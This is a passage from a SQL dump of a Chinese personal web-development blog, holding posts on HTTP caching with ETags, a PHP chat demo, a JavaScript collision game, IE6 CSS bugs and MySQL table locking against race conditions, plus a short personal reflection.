/>h3{font-size:14px;padding-top:10px;}<br /><p>完全可以写成这样</p><p>h1,h2,h3{font-size:14px;}<br />h2{color:#C00;}<br />h3{fpadding-top:10px;}<br /></pre><p>10.配置ETags，运用书中的描述就是：“ETag——实体标签（Entity Tag）是Web服务器与浏览器用于确认缓存组件的有效性的一种机制”。如果使用了ETags会在响应头加入一个ETag标记，而下次请求时浏览器会在请求头加入一个if-none-match标记，将ETag重新返回供服务器判断请求文件是否过期，但引用书中的描述是“ETag不会匹配，对于使用服务器集群来处理请求的网站来说，这是很常见的一种情况”，而且if-none-match比if-modified-since具有更高优先级，也就是说即使你配置了缓存策略而且确实文件没有处于需要更新的状态ETag值变了还是要重新下载文件，故paperen的建议是去掉ETag，而书中也提议到调整，但是如何调整就没说。</p><p>在.htaccess文件将缓存策略加上两行</p><pre>&lt;IfModule mod_expires.c&gt;<br />ExpiresActive on<br />&lt;FilesMatch ".(gif|jpg|jpeg|png|ico|js|css)$"&gt;<br />Header unset ETag<br />FileETag None<br />ExpiresDefault "access plus 2 weeks"<br />&lt;/FilesMatch&gt;<br />&lt;/IfModule&gt;<br /></pre><p>11.AJAX可缓存，ajax的优化其实都可以运用上述说的一些步骤的，压缩啦，精简js啦，ETag啦~而从ajax的运用上您可以考虑使用的是被动的方式还是主动的方式，比如有些ajax请求是可以在未发生之前就发动的，这些是为了将来而预先发起的，当用户点击某个按钮或者链接时就不需要太多等待就能获取到信息，预加载总是好的，但是得要分清楚哪些需要预加载而哪些不用，不能顾此失彼，做到平衡就很好了。</p><p>对了，最后还有个网址分享一下的，关于缓存的 <a href="http://www.mnot.net/cache_docs/" target="_blank">http://www.mnot.net/cache_docs/</a></p></p>', 2, 1, 732, 0, 1, 0, 1301228629, 0),
(70, 'Just For Fun', 'just-for-fun', 2, '<p>话说很久很久以前有个人，他的名字叫paperen，他一直想弄一个聊天工具……而又在同时他不知不觉间步入了WEB的领域，但他依然想弄个聊天工具……于是直到这篇Just For Fun的面世……</p><p>一个很囧的引子……其实呢，paperen我在毕业之前就弄了一个，那时打算将它作为毕设的，但结果用了那时在诺网期间那个IP屏蔽的东西作为自己的毕设~~这次再弄了一个，纯属是弄着玩而已，不过也花了些少功夫，代码架构上就一般般，并没有太多面向对象的味道，其实一开始是想发表一个关于在线的东东，结果弄着弄着就加上了聊天对话的东西……下面放出DEMO与RAR包的地址（如果你想做得更好，paperen可以说我这个还远远不够~~但这并不影响你去实现你想实现的更cool的东西）：</p><p>DEMO <a href="http://iamlze.cn/demo/just-for-fun/">iamlze.cn/demo/just-for-fun/</a></p><!--more--><p>RAR打包 <a href="http://iamlze.cn/demo/just-for-fun/just-for-fun.rar">iamlze.cn/demo/just-for-fun/just-for-fun.rar</a></p><p><a href="http://localhost/paperenblog/file/77" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/77" alt="20110420205051" title="上传于2011-04-20"></a></p><p>关于聊天与在线记录paperen我是用了sqlite数据库（其实就是一个文件，类似access数据库），好在空间的php有相应的支持。</p><p>paperen在此并有打算说任何关于代码的东西~~因为那个不是最重要的，没有思路即使你懂所有php的内置函数也没有用，paperen只想提提其中的思路而已。</p><p>First！从在线开始，问下自己到底web应用是如何判断用户在线或者不在线的？</p><p>目前的WEB应用（可以认为就是网站）都是一种请求-响应的模式，浏览器为你向网站服务器发出请求，服务器找到文件并解析完将一大堆文本送回给浏览器，浏览器进而去解析这些文本，最后呈现给用户看。可以看到浏览器不是总与服务器存在交流的，正如服务端响应完毕这个过程就已经完毕，换言之，判断用户是否在线的唯一线索在：用户在第一次请求后会否向服务器做出第二次，第三次请求……第N次，是否可以这样认为，如果在一定时间范围内用户不再次请求的话就被当作是不在线了，即使你仍停留在该网站的某个页面上，这种方法貌似有点说不过去，因为理论上我不在线应该是我离开了你的网站或者关闭了浏览器（相对于如果浏览器仍显示着该网站页面但因为不继续与服务器响应就被当作不在线的这种情况而言），是的，这不是绝对上的在线/不在线的判断方法，但基于这种主从式的模式，这确实只能这样做（至少paperen也是这么认为的），服务端不能主动地与之前向自身发出请求的客户端进行联系，所以也就不能主动地判断客户端的在线情况，只有使用时间来判断用户是否在线。</p><p>每次用户刷新页面或者点击网站上的链接，都会导致浏览器发出一次请求，而就在这次请求中更新该用户的时间就可以了，我们将2分钟作为判断在线/不在线的依据，每次用户请求时将当前时间记录下来，那么过了5分钟后再获得当前时间。</p><p>那么想知道谁在线就就将当前时间分别减去曾经记录的用户时间，若结果大于2分钟代表该用户离线，等于或小于表示在线，一般来说这个名词可以叫lastactivity。</p><p>如果你要求实时性很强的话而且又不想定时刷新整个页面就使用AJAX咯。</p><p>Second！其实聊天也是同样道理，因为是主从式的，所以也要隔一定时间向服务器发出请求并获取消息，而不是想象中的直接与聊天方通讯。</p><p>发觉还真没什么可以解析的，要解析的都在代码里面了。好吧，最后总结一下sync.php与msg.php的代码思路算了。</p><pre>/* <br /> * sync.php<br /> * 同步在线状态<br /> *<br /> * 引入配置文件<br /> * 获取动作参数与当前用户ID<br /> * 如果存在uid<br /> *      初始化数据库链接<br /> *      如果是更新用户活动时间<br /> *          有过往记录更新时间<br /> *          没有插入记录<br /> *      删除过时记录<br /> *      获取在线用户信息<br /> * <br /> */<br /></pre><pre>/*<br /> * msg.php<br /> * 消息<br /> *<br /> * 引入配置文件<br /> * 获取动作参数与当前用户ID<br /> * 如果是消息发送动作<br /> *      单纯的处理数据并插入<br /> * 如果是获取消息动作<br /> *      删除过期消息<br /> *      获取关于用户的对话信息<br /> *<br /> */<br /></pre><p>在代码里面也有在头部写上这些思路的，或者这也算是一个好习惯，不妨在自己写代码过程中也这样做试试。啊，对了，这个小DEMO让paperen发现原来自己一直以来都搞错了一个单词perfix应该是prefix才对……囧rz。</p><p>So far so good，希望你喜欢这个Just-For-Fun，能让你也想玩两手。</p></p>', 2, 1, 582, 1, 0, 0, 1303391960, 0),
(71, 'js碰撞游戏一枚', 'js-collision-game', 3, '<p>一直都觉得javascript可以玩得很cool。所以终于尝试了使用js来写了一个小游戏，界面上其实也没什么特色~~普普通通吧，paperen将这个游戏取名为（untouchable）不可触及，游戏规则其实很简单，不要让那个按钮与那些飞来飞去的小球发生碰撞，看你能熬到多少秒。</p><p><a href="http://localhost/paperenblog/file/78" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/78" alt="20110521142514" title="上传于2011-05-21"></a></p><p>&nbsp;untouchable游戏地址\r\n&nbsp;<a href="http://iamlze.cn/demo/collision/" target="_blank">http://iamlze.cn/demo/collision/</a></p><!--more--><p>关于游戏说明在这个地址都会有的啦，很简单自己玩下就了解了。而这个游戏的源代码全部都在页面上了，自己查看源代码就有了，所以可以说javascript与css都是开源的~~</p><p>关于这个游戏的js代码，paperen实在不能解析太多，什么都在代码中了，有兴趣的人一看就明白了，在这里就说一下paperen在写js过程中一些思路的东西吧。</p><p>1.整个游戏明显是有两种对象存在的，弹来弹去的小球（单选框radio）与那个带有郁闷表情的控制块（按钮button |-_-|）所以我分别写了两个类ball与block。而各自都有自己一些方法与参数，现在想想貌似可以将它们之间的一些公共特性抽出来作为一个类的，而ball与block可以去继承这个父类~~</p><p>2.关于小球的反弹效果，可以看一下ball中的Run与changeDirection方法。</p><p>paperen将北，东北，东，东南，南，南西，西，西北用了1，2，3，4，5，6，7，8表示。</p><p>changeDirection的第一个参数是代表x轴上的方向，第二个参数是y轴的方向，(-1,0)代表将向x轴的0方向运动，(1,0)将向x轴的无穷方向运动，(0,-1)代表将向y轴的0方向运动，(0,1)代表将向y轴的无穷方向运动。</p><p>之后就是一开始定义的速度根绝方向对小球的left与top进行调整了，setPosition方法。可能这里paperen搞得比较繁琐……</p><p>3.关于控制块的跟踪鼠标行为其实是绑定了一个事件</p><pre>if ( IE ) {<br />	document.onmousemove = control_block;<br />} else {<br />	EventUtil.addListener( window, "mousemove", control_block );<br />}<br /></pre><p>当触发mouseover的时候就会执行control_block，具体如何获得鼠标的x与y具体看 control_block吧，\r\n&nbsp;记得要减去游戏区域的x，y与控制块的宽度/2，高度/2（因为要让鼠标处于控制块的中心位置）<br /></p><p>4.使用魔法效果（隐身），其实一开始是创建了两个控制块。</p><pre>//向区域加入控制块<br />tmp = new block();<br />block_instance.push( tmp.create(1).initPosition() );<br />tmp = new block();<br />block_instance.push( tmp.create(2).iMagic().initPosition() );<br /></pre><p>注意第二个控制块使用create后又调用了iMagic的方法，来声明这是魔法块。给控制块绑定click事件（在create的时候）useMagic，那么点击的时候就会触发useMagic了，请留意一下useMagic，paperen是使用了三个参数1，0，-1分别代表启动魔法效果，0代表魔法效果执行中，-1代表魔法效果使用完毕。一开始定义魔法效果为4秒，所以要在倒数两秒时给玩家一些提示，提示魔法效果将会结束，于是就是调用 useMagic(0)这个函数了 。</p><pre>//提示取消魔法效果<br />if ( magicTimer &gt;= 2000 ) {<br />	//取消魔法效果<br />	useMagic(-1);<br />} else {<br />	for( i=0; i<block_instance.length; i++="" )="" {<br="">		if ( block_instance[i].magic ) {<br />			if ( magicTimer % 200 == 0 ) {<br />				document.getElementById( block_instance[i].id ).style.display = "block";<br />				block_instance[i].setFace( block_faces[0] );<br />			} else {<br />				document.getElementById( block_instance[i].id ).style.display = "none";<br />				block_instance[i].setFace( block_faces[3] );<br />			}<br />		} else {<br />			document.getElementById( block_instance[i].id ).style.display = ( magicTimer % 200 == 0 ) ? "none" : "block";<br />		}<br />	}<br />	magicTimer += 100;<br />	setTimeout("useMagic(0)", 100);<br />}<br /><br /></pre><p>一进来就判断魔法计数器是否超过2秒了，如果是直接就代表魔法使用完毕了，每200毫秒改变一下控制块的样式，并让统计器加100再定时执行自身。</p><p>5.检查碰撞check_collision，就是定时执行这个函数，思路其实也很简单，就是循环检查小球的当前位置是否落在控制块的面积区域内，有则定义为发生碰撞。</p><pre>//判断是否碰撞<br />function check_collision() {<br />	if ( block_instance.length  &lt;= 0 || gameOver || block_magic_state ) return false;<br />	block = block_instance[0];<br />	for( i=0; i<ball_num; i++="" )="" {<br="">		tmp = ball_instance[i];<br />		if ( tmp.x + tmp.width &gt; block.x &amp;&amp; tmp.x &lt; block.x + block.width &amp;&amp; tmp.y + tmp.height &gt; block.y &amp;&amp; tmp.y &lt; block.y + block.height ) {<br />			//碰撞了<br />			block.setFace( block_faces[1] );<br />			Over();<br />			return false;<br />		}<br />	}<br />}<br /></pre><p>6.所有的东西动离不开定时执行，setTimeout与setInterval，请弄明白这两个函数的区别才能让你更好地使用它们，前者只会到达定时时执行一次指定的动作之后就没有了，后者则会到达定时就执行一次动作后再重新计时。</p><p>7.最后记录分数当然使用了XML Http这个对象来将分数异步传递给一个php页面进行记录，又再次使用了轻量级的数据库sqlite。</p><p>8.paperen对IE下的一卡一卡的现象还是不能了解清楚（有高手在的话能不能给paperen点提示），肯定与自己的代码有关，可能会比较耗资源，要改善的东西还是很多而且还有更多玩法（让控制块一定时间变大……让小球一定时间变大……让小球一定时间跟踪控制块……有些很Bt的想法，哈哈），当然可能存在不少BUG……希望大家提出~~</p><p>9.希望大家喜欢这个游戏，老实说paperen最高记录只能顶到67.4秒，上个图为证，不要说paperen作弊（发誓不是ps的！发誓不是改了某个参数的！）……希望你们也不要作弊……</p><p><a href="http://localhost/paperenblog/file/79" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/79" alt="20110521150745" title="上传于2011-05-21"></a></p><p>好吧，最后在此顺便也提一提前段时间的google banner那个动画效果，新浪微博说竟然有人说是css做的，而且博猪还是拥有较多粉丝的，所以可能有不少人被误导了，不知道有多少人去看过源码，凡是有web开发经验的人第一时间都不会觉得是使用css做的，因为css除了使用explosion可以起到一些脚本作用外，它主要是用来渲染与布局页面的，根本不存在这种动态改变DOM（文档结构与元素）的能力。下面是paperen扒了那天的动画再放上来分享的地址，google是有将js进行压缩的，故paperen也使用<a href="http://jsbeautifier.org/" target="_blank">jsbeautifier</a>这个在线工具进行还原了（更适合人类看代码了）</p><p><a href="http://iamlze.cn/demo/google-banner/" target="_blank">http://iamlze.cn/demo/google-banner/</a></p><p>不妨看看源代码</p><pre>l = function () {<br />	var a = d[f],<br />		c = document.getElementById("hplogo");<br />	if (c &amp;&amp; a[0]) {<br />		var b = document.createElement("div");<br />		b.id = "hplogo" + f;<br />		b.style.left = a[0] + "px";<br />		b.style.top = a[1] + "px";<br />		b.style.width = a[2] + "px";<br />		b.style.height = a[3] + "px";<br />		b.style.background = "url(graham11-hp-sprite.png) no-repeat " + -g + "px " + -h + "px";<br />		b.onmousedown = k;<br />		a[3] &gt; i &amp;&amp; (i = a[3]);<br />		a[4] ? (g = 0, h += i, i = 0) : g += a[2];<br />		c.appendChild(b);<br />		++f;<br />		f &lt; e &amp;&amp; (j = window.setTimeout(l, 83))<br />	}<br />},<br />m = function () {<br />	google.doodle.a = !1;<br />	i = h = g = f = 0;<br />	j != -1 &amp;&amp; (window.clearTimeout(j), j = -1);<br />	for (var a = 0; a &lt; e; ++a) {<br />		var c = document.getElementById("hplogo" + a);<br />		c &amp;&amp; c.parentNode &amp;&amp; c.parentNode.removeChild(c)<br />	}<br />	j = window.setTimeout(l, 83)<br />};<br /><br /></pre><p>最关键的就是这个l（google对变量也进行了简化压缩），或者你可以将它当为是播放的执行(play)，就像是flash播放到某一帧，当然还有一个关键就是d这个很长长的数据~~paperen在此就不放出来了，例如：[69, 0, 164, 139, 1]，69代表了要将创建的div元素的x为相对hplogo元素的69px位置，0代表将div元素的y为相对hplogo的0px位置，164代表div的宽度，139代表高度，背景图片为&nbsp;\r\ngraham11-hp-sprite.png并且将图片定位到-g，-h的位置（CSS Split技巧）。而注意以下两行代码，很精炼<br /></p><pre>a[3] &gt; i &amp;&amp; (i = a[3]);<br />a[4] ? (g = 0, h += i, i = 0) : g += a[2];<br /></pre><p>就是对背景定位进行的控制，如果数组第三个位置大于i即记录此时的高度，如果数组第四个位置存在值且大于0，背景图片x坐标回零，高度加上现在的i，否则x坐标加上当前宽度。</p><p>在整个过程都使用了js不断往hplogo元素里面插入子元素，直到到达d数组的最大长度。</p><p>请结合firebug或者opera的dragon fly等页面调试工具进行分析，关于那张图片 <a href="http://iamlze.cn/demo/google-banner/graham11-hp-sprite.png" target="_blank">http://iamlze.cn/demo/google-banner/graham11-hp-sprite.png</a> 可能你会更明白一点。</p><p>paperen认为主要功夫是放在这张图片上的，代码花的时间可能不到半个小时~~怎都好，希望你能喜欢javascript，因为它真的可以玩得很cool~~</p></p>', 2, 1, 545, 0, 1, 0, 1305964152, 0),
(72, '经常会遇到的css兼容性问题', 'css-compatibility-solution', 3, '<p>弄过网页布局的同学都应该知道一件事情——在火狐、chrome、opera这些浏览器弄得好好的页面到了IE6中却让你无语。是的，那也就是浏览器的css兼容性问题，在IE6下有些事情就出了一些令人意想不到的bug~~所以在写css的时候推荐使用多个浏览器同时调试，才能保证兼容性问题一个接一个地被解决。</p><p><a href="http://localhost/paperenblog/file/80" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/80" alt="20110710191930" title="上传于2011-07-10"></a></p><p>而这篇文章就是总结一下一些paperen经常遇到的css兼容性问题以及解决方法。直接切入主题吧。</p><!--more--><h3>1.Expanding Box Problem（扩大盒子问题……不知道我翻译得对不对）</h3><p>引起这个问题的原因是容器里面的内容长度或者高度超过了容器自身所定义的宽/高度而导致的，很简单的一个例子如下：</p><pre>&lt;div style="width:10px;border:1px #CCC solid;padding:10px;"&gt;ExpandingBoxProblem&lt;/div&gt;<p>paperen在opera下查看的效果是英文文本会超过容器的10px宽度，而在ie6下容器会将宽度自适应文本宽度，如果没留意的话可能导致的结果是在IE6下会影响一些元素的布局，例如如果使用了浮动。<br /><a href="http://localhost/paperenblog/file/81" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/81" alt="20110710190028" title="上传于2011-07-10"></a><br /></pre><p>解决办法（solution）：对于IE可以使用word-wrap: break-word，而其他浏览器可以使用overflow:hidden;<br /></p><p><a href="http://www.adobe.com/cfusion/communityengine/index.cfm?event=findByTextId&amp;productid=1&amp;textid=EXPANDING_BOX_PROBLEM" target="_blank">adobe上的解析说明</a><br /></p><h3>2.Doubled float margin bug（双浮动边距）</h3><p>引起这个问题的原因是当子元素是浮动，被设置与父元素存在一定距离，父元素也浮动而且与子元素浮动方向一致时就会出现此问题。</p><pre>&lt;style&gt;<br />body{margin:0;padding:0;}<br />ul,li{list-style:none;}<br />&lt;/style&gt;<br />&lt;ul style="float:left;border:1px #D0D0D0 solid;width:300px;margin:20px;padding:0;"&gt;<br />	&lt;li style="float:left;margin-left:40px;"&gt;Doubled float margin bug&lt;/li&gt;<br />&lt;/ul&gt;</pre><p>在opera下显示英文文本是距离左边40px的，但是在IE6下就变成双倍距离了。<br /></p><p><a href="http://localhost/paperenblog/file/82" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/82" alt="20110710191851" title="上传于2011-07-10"></a></p><p>解决办法（solution）：为子元素加上display: inline;</p><p><a href="http://www.adobe.com/cfusion/communityengine/index.cfm?event=findByTextId&amp;productid=1&amp;textid=DOUBLED_FLOAT_MARGIN" target="_blank">adobe上的解析说明</a><br /></p><h3>3.Unscrollable content bug（不能滚动的内容）</h3><p>引起这个问题的原因是子元素被设置为绝对定位，父元素被设置为相对定位。<br /></p><pre>&lt;h2 style="position:relative;border:1px #D0D0D0 solid;padding-left:40px;"&gt;Unscrollable content bug&lt;span style="position:absolute;left:0;top:0;width:20px;height:30px;display:block;background:#CCC;"&gt;&lt;/span&gt;&lt;/h2&gt;</pre><p>在opera下灰色块是不会遮挡文本的，而IE6下的padding-left则是不会对灰色块产生任何影响，文本被其遮挡了。<br /><a href="http://localhost/paperenblog/file/83" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/83" alt="20110710193759" title="上传于2011-07-10"></a><p>解决办法（solution）：单独对IE使用zoom：1; 应用在相对定位的元素上</p><p><a href="http://www.adobe.com/cfusion/communityengine/index.cfm?event=findByTextId&amp;productid=1&amp;textid=UNSCROLLABLE_CONTENT" target="_blank">adobe上的解析说明</a></p><h3>4.Disappearing List Background Bug（列表背景消失）</h3><p>引起这个问题的原因是列表设置了背景而父元素被设置为浮动并是相对定位，引用adobe上的例子如下</p><pre>&lt;style&gt;<br />div#wrapper {<br />    position: relative;  /* triggers bug */<br />    float: left;<br />    width: 250px;  <br />}    <br />div#wrapper dt {<br />    background:#CCCCEE;  /* triggers bug */ <br />}<br />&lt;/style&gt;<p>&lt;div id="wrapper"&gt;<br />&lt;dl&gt;<br />&lt;dt&gt;List One&lt;/dt&gt;  &lt;!-- this background won''t render --&gt;<br />    &lt;dd&gt;Subitem 1 &lt;/dd&gt;<br />    &lt;dd&gt;Subitem 2 &lt;/dd&gt;<br />    &lt;dd&gt;Subitem 3 &lt;/dd&gt;<br />    &lt;dd&gt;Subitem 4 &lt;/dd&gt;<br />    &lt;dd&gt;Subitem 5 &lt;/dd&gt;<br />&lt;dt&gt;List Two&lt;/dt&gt;  &lt;!-- this background will render --&gt;<br />    &lt;dd&gt;Subitem 1 &lt;/dd&gt;<br />    &lt;dd&gt;Subitem 2 &lt;/dd&gt;<br />    &lt;dd&gt;Subitem 3 &lt;/dd&gt;<br />    &lt;dd&gt;Subitem 4 &lt;/dd&gt;<br />    &lt;dd&gt;Subitem 5 &lt;/dd&gt;<br />&lt;/dl&gt; <br />&lt;/div&gt;</pre><p>opera下list one与list two都有背景的，但是IE6下则第一个没有背景</p><p><a href="http://localhost/paperenblog/file/84" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/84" alt="20110710195306" title="上传于2011-07-10"></a></p><p>解决办法（solution）：为出现bug的列表项加上position:relative;</p><p><a href="http://www.adobe.com/cfusion/communityengine/index.cfm?event=findByTextId&amp;productid=1&amp;textid=DISAPPEARING_LIST_BACKGROUND" target="_blank">adobe上的解析说明</a></p><h3>5.Extra Whitespace in List Links bug（额外空白出现在列表链接）</h3><p>引起这个问题的原因列表中的链接元素被设置为display:block;&nbsp;<br /></p><pre>&lt;ul&gt;<br />&lt;li&gt;&lt;a href="#" style="display:block;"&gt;Extra Whitespace in List Links bug&lt;/a&gt;&lt;/li&gt;<br />&lt;li&gt;&lt;a href="#" style="display:block;"&gt;Extra Whitespace in List Links bug&lt;/a&gt;&lt;/li&gt;<br />&lt;/ul&gt;</pre><p>在opera中两行文本之间的间隔是正常的，而在IE6下则间隔较大</p><p><a href="http://localhost/paperenblog/file/85" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/85" alt="20110710200518" title="上传于2011-07-10"></a></p><p>解决办法（solution）：为每个a加上zoom:1;（应该只对IE进行hack，因为zoom属性在其他浏览器不支持）</p><p><a href="http://www.adobe.com/cfusion/communityengine/index.cfm?event=findByTextId&amp;productid=1&amp;textid=EXTRA_WHITESPACE_IN_LIST_LINKS" target="_blank">adobe上的解析说明</a></p><h3>6.z-index bug</h3><p>最后一个，但这个paperen也没搞明白是怎出来的……有了解的同学麻烦给我说说。不过还是可以看看<a href="http://www.adobe.com/cfusion/communityengine/index.cfm?event=findByTextId&amp;productid=1&amp;textid=ZINDEX_BUG" target="_blank">adobe上的解析</a></p><p><br /></p><p>暂时先这么多吧，有待补充~~</p></p>', 2, 1, 423, 0, 0, 0, 1310300234, 0);
INSERT INTO `post` (`id`, `title`, `urltitle`, `categoryid`, `content`, `authorid`, `ispublic`, `click`, `good`, `bad`, `savetime`, `posttime`, `isdraft`) VALUES
(73, '后知后觉的Mysql锁表应用', 'lock-table', 4, '<p>在看CI（codeigniter）database那一节的手册发现其自带了事务的处理，之后又不知不觉地查了一些资料，在某个地方看到有个例子，具体描述类似如下：商店现在某商品只有1件库存，然后A与B在网上进行下订，A与B几乎同时（或许也就差几毫秒，A比B快那么一点点）进行。</p><p>很明显是只有A才能成功下单的，B则会收到库存不足的提示，但是作为放置在服务端的那个页面（或者称为脚本程序）我们得怎样去处理这个问题呢？或者我先放出一段代码吧。</p><pre>$sql = "select number from goods where id=1";<br />$number = intval( $db-&gt;result( $db-&gt;query( $sql ), 0 ) );<br />if ( $number &gt; 0 ) {<br />	sleep( 2 );<br />	$sql = "update goods set number=number-1 where id = 1";<br />	if ( $db-&gt;query( $sql ) ) {<br />		echo ''Ok!Here you are!'';<br />	} else {<br />		echo ''Sorry!Something go wrong!Try it again.'';<br />	}<br />} else {<br />	echo ''No more!you are so late!'';<br />}</pre><p>这部分代码除了缺少一定注释外都写得没错，当然$db是一个操作数据库的类，我只是将大部分方法封装了，这里的逻辑也是很明显了。</p><!--more--><p>先获取id为1这个东东的库存数，看看是否为0，如果为0就订购不成功了，如果大于0则将库存减1然后提示ok。这确实没有任何错误，逻辑也对。如果请求是一个接一个地产生的，那么什么问题都没有，但当一些并发情况（paperen也不想用这种专业的名词，其实就是上面那个例子的情况，在相差不明显的时间内有多个请求产生）出现时就可能出现一些无厘头的问题了。你想啊，是不是可能存在一种情况，A刚发出请求，脚本处理到update之前B又发出请求，那么现在库存依然还有1，因为A的update还没有执行呢，所以$number不少于0，这次完了，B也下单了，于是库存变成-1了（假设原来只有1件），确实是一个荒谬而且比较搞笑的结果。</p><p>出现问题的原因很明显，就是忽略了这种并发情况的考虑，处理下订应该是种队列方式，也就是先来先得，就是说在执行这个下订动作是要排队的，前面的那个先下订然后后者才能下订，当然当后者下订前才再判断库存的数量。那么怎样解决这个问题呢，在程序层面上貌似真的没有方法去解决这个问题（paperen可没想到代码上的解决方案，有思路的可以留个言），所以在此才提到锁表的概念，你想啊，上面出现这个问题的归根于没有控制一个select number的先后顺序（或者可以这么说吧），因为在A执行update之前你又允许B去查询库存，当然结果还是1，至少要等待A更新库存后才允许其他人的任何操作，也就是对goods表进行一个排队操作，对goods表进行锁定。</p><p>说到这里，请不要以为锁表有多么高深，其实它就是一条sql</p><pre>LOCK TABLE `table` [READ|WRITE]</pre><p>解锁</p><pre>UNLOCK   TABLES;</pre><p>引用专业的描述是</p><p>LOCK   TABLES为当前线程锁定表。 UNLOCK   TABLES释放被当前线程持有的任何锁。当线程发出另外一个LOCK   TABLES时，或当服务器的连接被关闭时，当前线程锁定的所有表会自动被解锁。 &nbsp;</p><p>如果一个线程获得在一个表上的一个READ锁，该线程和所有其他线程只能从表中读。 如果一个线程获得一个表上的一个WRITE锁，那么只有持锁的线程READ或WRITE表，其他线程被阻止。</p><p>已经是有种队列的味道，对不，所以解决方案很简单嘛，在select前加锁，执行完后面逻辑代码后解锁。或许有没有人会有一个疑问，就是如果万一锁表后线程就断掉了那么是不是就一直锁表了，这个确实是可能存在但是既然你想到了那么数据库的设计人员也一定考虑到了，可以告诉你关于unlock的一些资料：当线程发出另一个 LOCK TABLES，或当与服务器的连接被关闭时，被当前线程锁定的所有表将被自动地解锁。这下放心了吧。</p><p>好，看下改进后的代码。</p><pre>$db-&gt;lock( ''goods'', 2 );<br />$sql = "select number from goods where id=1";<br />$number = intval( $db-&gt;result( $db-&gt;query( $sql ), 0 ) );<br />if ( $number &gt; 0 ) {<br />	sleep( 2 );<br />	$sql = "update goods set number=number-1 where id = 1";<br />	if ( $db-&gt;query( $sql ) ) {<br />		echo ''Ok!Here you are!'';<br />	} else {<br />		echo ''Sorry!Something go wrong!Try it again.'';<br />	}<br />} else {<br />	echo ''No more!you are so late!'';<br />}<br />$db-&gt;unlock();</pre><p>只加了两行代码，不过也不能这么说，因为paperen我修改了自己那个操作数据库的类，加了两个方法lock与unlock，其实这两个方法也很简单。</p><pre>/**<br /> * 锁表<br /> * @param string $table 表名<br /> * @param int $type 读锁1还是写锁2<br /> */<br />public function lock( $table, $type = 1 ) {<br />	$type = ( $type == 1 ) ? ''READ'' : ''WRITE'';<br />	$this-&gt;query( "LOCK TABLE `$table` $type" );<br />}<br /><br />/**<br /> * 解锁<br /> */<br />public function unlock() {<br />	$this-&gt;query( "UNLOCK TABLES" );<br />}</pre><p>关于lock自己可以再斟酌一下，因为第二个参数这样弄看上去并不太舒服。嗯哼~那怎测试呢？paperen使用jmeter进行测试结果。关于jmeter可以在<a href="http://jakarta.apache.org/site/downloads/downloads_jmeter.cgi" target="_blank">http://jakarta.apache.org/site/downloads/downloads_jmeter.cgi</a> 这里下载，在邪恶的人手中可以是一个恐怖的工具在善良的人手中是一个友好的工具。</p><p>您需要创建两个线程，其实就是对服务器发出两个请求。</p><p><a href="http://localhost/paperenblog/file/86" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/86" alt="20110716172330" title="上传于2011-07-16"></a></p><p>具体配置paperen在此不说，我导出了一个计划文件，大家可以试着打开就能看到paperen是怎测试的了。<a href="http://iamlze.cn/demo/locktable/locktable.jmx" target="_blank">http://iamlze.cn/demo/locktable/locktable.jmx</a></p><p>保存下来然后导入必需调整一下你本地测试的路径，最后ctrl+R（运行），在线程下查看结果树就有请求的回应信息了。</p><p>首先测试不加锁表的情况（就是一开始不加lock与unlock操作的代码）看看两个线程出来的结果。</p><p><a href="http://localhost/paperenblog/file/87" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/87" alt="20110716173700" title="上传于2011-07-16"></a></p><p>都是ok~~再看数据库</p><p><a href="http://localhost/paperenblog/file/88" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/88" alt="20110716173746" title="上传于2011-07-16"></a></p><p>然后将number改回1，再将lock与unlock，锁表操作加上，再运行。</p><p><a href="http://localhost/paperenblog/file/89" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/89" alt="20110716174048" title="上传于2011-07-16"></a></p><p>好吧，数据表就不用看了吧，结果已经很明显了，再前一个请求对表操作完成之前，之后那些请求都要在等待，直到前面请求完成了才能操作，也就是队列的味道。</p><p>老实说mysql的事务也需要下点功夫研究一下，paperen关于锁表的了解也就是在查看事务的过程中产生的，在高级的应用过程中这种技术就更加重要，更加严谨的逻辑代码与严谨的数据库管理才能更进一步保证数据的真实与准确性。真是后知后觉。</p><p>啊哈~总之路仍然很长，要学的东西一辈子都学不完，这就是人生之路~~paperen只知道此时此刻自己依然爱好着web开发方面，但我想已经足够了，未来的事情谁也不能预料，难道不是么。</p></p>', 2, 1, 622, 0, 0, 0, 1310809727, 0),
(74, '{生活:工作}', 'i-feel-tire', 1, '<p>若不是opera的快速拨号里面有自己博客的一张图片，paperen我都不会想到该来写点东西。最近一下了班就什么都不想做，感觉真的很累，也渐渐地失去了激情~~或者自己早已经预料会有这么一天的到来，但还是觉得来得有点早，还以为能坚持下去，但是发觉越来越难~~</p><p>也或许出来社会就是这样，在生命结束的那一刻才会有一种成就感才能对自己的一生做出评价，而之前的日子就像在长跑，可能是每天每夜地在同一个地方绕圈也可能是不断向前迈进。但很多时候我们也会感觉到迷茫，消极，看到成功的人如何如何，很多时候会觉得对那种长跑感到厌倦。大家老是说“成功没有捷径，惟有勤奋而已”，虽然感觉这是一句勉励自己的话，但有时候却觉得这是一句傻子才会说的话。人有时候也总是会表现出消极的一面，却不总是一件坏事。</p><p>paperen你是在自我安慰吗？是的，我是在自我修复这种疲倦，但这种方法越来越不奏效。</p><!--more--><p>很多时候自己能感觉到时间正在流逝，但是却不知道能做些什么让逝去的时间变得丰富多彩，变得不单调。paperen我害怕别人问我一天是怎样渡过的，因为根本没有什么事情值得说的。累，确实是体现在心灵上~\r\n&nbsp;</p><p>有个同事问我为什么这么积极？我真的想告诉他我的积极是假的，但是又不得不承认自己对工作是感兴趣的，只是兴趣越来越少了。看看自己的死党们，他们过得也不错，但有的貌似比我还辛苦。看看每天公交上的乘客，有的穿得很光鲜，有的却表现出很疲累。如果是看看周围的话，paperen还是觉得自己过得很不错，我老是这样对我妈妈说的。</p><p>回去睡觉吧~~此文仅作为现在的我一种心态记录而已</p></p>', 2, 1, 311, 0, 0, 0, 1314880761, 0),
